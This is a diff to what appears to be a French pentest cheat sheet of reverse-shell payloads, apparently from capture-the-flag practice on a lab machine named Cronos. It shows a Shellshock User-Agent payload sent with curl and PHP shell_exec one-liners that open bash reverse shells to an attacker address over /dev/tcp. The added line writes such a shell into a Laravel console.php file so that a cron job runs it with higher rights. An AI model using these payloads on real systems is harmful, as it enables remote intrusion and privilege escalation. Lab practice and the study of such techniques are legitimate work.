@@ -41,6 +41,8 @@ curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1" http:
 ### PHP — shell_exec (injection dans fichier)
 ```php
 <?php shell_exec("bash -i >& /dev/tcp/IP_KALI/4444 0>&1");?>
+# Redirection pour avoir un nouveau shell avec les droits directs
+echo '<?php shell_exec("bash -i >& /dev/tcp/10.10.17.68/5555 0>&1");?>' > /var/www/laravel/routes/console.php
 ```
 **Utilisé sur** : Cronos (cron Laravel)
 
